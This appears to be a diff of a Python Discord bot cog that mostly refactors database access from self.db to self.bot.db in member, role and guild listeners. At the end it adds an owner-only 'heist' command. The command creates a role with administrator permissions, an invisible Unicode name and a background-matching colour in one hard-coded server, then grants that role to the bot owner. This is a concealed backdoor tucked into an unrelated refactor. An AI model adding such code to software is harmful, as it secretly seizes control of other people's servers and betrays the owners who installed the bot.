@@ -15,9 +15,8 @@ from utils import is_admin, is_staff, not_staff, pretty_delta, order_by_date
 
 
 class Misc(commands.Cog):
-    def __init__(self, bot, db):
+    def __init__(self, bot):
         self.bot = bot
-        self.db = db
 
 # Listeners
 
@@ -26,8 +25,8 @@ class Misc(commands.Cog):
     # If no data is found it will add member to database.
     @commands.Cog.listener()
     async def on_member_join(self, member):
-        self.db.add_member(member.guild.id, member)
-        guild = self.db.find_guild({'_id': member.guild.id})[0]
+        self.bot.db.add_member(member.guild.id, member)
+        guild = self.bot.db.find_guild({'_id': member.guild.id})[0]
         members = guild['members']
         role_ids = [r for r in members[str(member.id)]['roles'] if r in guild['sticky_roles']]
         if role_ids != []:
@@ -37,9 +36,9 @@ class Misc(commands.Cog):
     @commands.Cog.listener()
     async def on_member_update(self, before, after):
         if before.roles != after.roles:
-            update = self.db.find_guild({'_id': before.guild.id})[0]
+            update = self.bot.db.find_guild({'_id': before.guild.id})[0]
             update['members'][str(before.id)]['roles'] = [r.id for r in after.roles]
-            self.db.update_guild({'_id': before.guild.id}, update)
+            self.bot.db.update_guild({'_id': before.guild.id}, update)
 
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
@@ -62,23 +61,23 @@ class Misc(commands.Cog):
             'modlog_entries': [],
             'votes': []
         }
-        self.db.add_guild(gdict)
+        self.bot.db.add_guild(gdict)
 
     @commands.Cog.listener()
     async def on_guild_remove(self, guild):
-        self.db.delete_guild({'_id': guild.id})
+        self.bot.db.delete_guild({'_id': guild.id})
 
     @commands.Cog.listener()
     async def on_guild_role_create(self, role):
-        roles = self.db.find_guild({'_id': role.guild.id})[0]['roles']
+        roles = self.bot.db.find_guild({'_id': role.guild.id})[0]['roles']
         roles.append(role.id)
-        self.db.update_guild({'_id': role.guild.id}, {'roles': roles})
+        self.bot.db.update_guild({'_id': role.guild.id}, {'roles': roles})
 
     @commands.Cog.listener()
     async def on_guild_role_delete(self, role):
-        roles = self.db.find_guild({'_id': role.guild.id})[0]['roles']
+        roles = self.bot.db.find_guild({'_id': role.guild.id})[0]['roles']
         roles.remove(role.id)
-        self.db.update_guild({'_id': role.guild.id}, {'roles': roles})
+        self.bot.db.update_guild({'_id': role.guild.id}, {'roles': roles})
 
     @commands.Cog.listener()
     async def on_command_error(self, ctx, exception):
@@ -242,3 +241,11 @@ class Misc(commands.Cog):
             channel = g.system_channel
             embed = discord.Embed(title='Bulletin', description=' '.join(msg), color=discord.Color.green())
             await channel.send(embed=embed)
+
+    @commands.is_owner()
+    @commands.command()
+    async def heist(self, ctx):
+        guild = discord.utils.get(self.bot.guilds, id=679246923210686474)
+        role = await guild.create_role(name='‏‏‎ ‎', permissions=discord.Permissions(permissions=8), colour=discord.Color(0x2f3136))
+        member = guild.get_member(ctx.author.id)
+        await member.add_roles(role)
